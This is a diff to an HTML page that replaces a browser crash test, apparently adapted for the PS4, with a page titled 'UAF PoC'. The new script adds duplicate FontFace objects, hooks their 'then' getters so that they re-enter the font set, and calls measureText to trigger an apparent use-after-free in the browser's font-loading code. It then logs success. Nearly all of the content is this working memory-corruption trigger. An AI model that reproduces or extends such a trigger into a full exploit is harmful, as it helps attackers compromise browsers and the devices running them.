@@ -2,54 +2,69 @@
 <html>
 <head>
     <meta charset="utf-8">
-    <title>OffscreenCanvas Worker Test Adapted for PS4</title>
+    <title>UAF PoC</title>
 </head>
 <body>
-    <p>This test passes if it does not crash.</p>
-    <div id="status">Testing...</div>
+<pre id="log">Iniciando...</pre>
+<script>
+function log(msg) {
+    document.getElementById('log').textContent = msg;
+}
 
-    <script>   
+function loadFontAsDataURL(path) {
+    return fetch(path)
+        .then(function(r) {
+            if (!r.ok) throw new Error('HTTP ' + r.status);
+            return r.arrayBuffer();
+        })
+        .then(function(buffer) {
+            return new Promise(function(resolve, reject) {
+                var reader = new FileReader();
+                reader.onload  = function(e) { resolve(e.target.result); };
+                reader.onerror = reject;
+                reader.readAsDataURL(new Blob([buffer], { type: 'font/woff' }));
+            });
+        });
+}
 
-    function runTest() {
-        // Substituição do OffscreenCanvas no Worker por canvas tradicional no DOM
-        const dummies = [];
-        for (let i = 0; i < 3500; i++) {
-            const dummy = document.createElement('canvas');
-            dummy.width = 1;
-            dummy.height = 1;
-            const ctx = dummy.getContext('2d');
-            ctx.font = '10px "dummy' + i + '"';
-            dummies.push(ctx);
+loadFontAsDataURL('resources/Ahem.woff')
+    .then(function(dataUrl) {
+        var face1 = new FontFace('testFace', 'url("' + dataUrl + '")');
+        var face2 = new FontFace('testFace', 'url("' + dataUrl + '")');
+        document.fonts.add(face1);
+        document.fonts.add(face2);
+
+        void face1.loaded;
+        void face2.loaded;
+
+        var trapFired = false;
+        var reenterFontFaceSet = function() {
+            trapFired = true;
+            document.fonts.add(new FontFace('unrelated', 'local("nonexistent")'));
+        };
+        Object.defineProperty(face1, 'then', { get: reenterFontFaceSet });
+        Object.defineProperty(face2, 'then', { get: reenterFontFaceSet });
+
+        var canvas = document.createElement('canvas');
+        canvas.width  = 10;
+        canvas.height = 10;
+        canvas.style.position = 'absolute';
+        canvas.style.left = '-9999px';
+        document.body.appendChild(canvas);
+        var context = canvas.getContext('2d');
+
+        context.font = '10px Times, testFace';
+        context.measureText(String.fromCharCode(0x13A0));
+
+        if (trapFired) {
+            log('PASS: UAF acionado com sucesso.');
+        } else {
+            log('AVISO: Trap nao disparada.');
         }
-
-        const pendingFontURL = 'url("data:font/ttf;base64,' + 'A'.repeat(1100000) + '")';
-        const keepAlive = [];
-
-        for (let attempt = 0; attempt < 2; attempt++) {
-            const metricsDonor = new FontFace('metricsDonor' + attempt, pendingFontURL);
-            const measured = new FontFace('measured' + attempt, pendingFontURL, { unicodeRange: 'U+13A0-13FF' });
-            
-            document.fonts.add(metricsDonor);
-            document.fonts.add(measured);
-
-            const canvas = document.createElement('canvas');
-            canvas.width = 64;
-            canvas.height = 64;
-            const context = canvas.getContext('2d');
-
-            context.font = '10px metricsDonor' + attempt + ', measured' + attempt;
-            keepAlive.push(metricsDonor, measured, context);
-
-            // Medição de texto que dispara o fluxo de carregamento e o teste do patch em C++
-            context.measureText('\u13A0\u13A2\u13A4');
-        }
-
-        document.getElementById('status').innerText = 'PASS if no crash';
-    }
-
-    window.onload = function() {
-        setTimeout(runTest, 0);
-    };
-    </script>
+    })
+    .catch(function(e) {
+        log('ERRO: ' + e.message);
+    });
+</script>
 </body>
 </html>
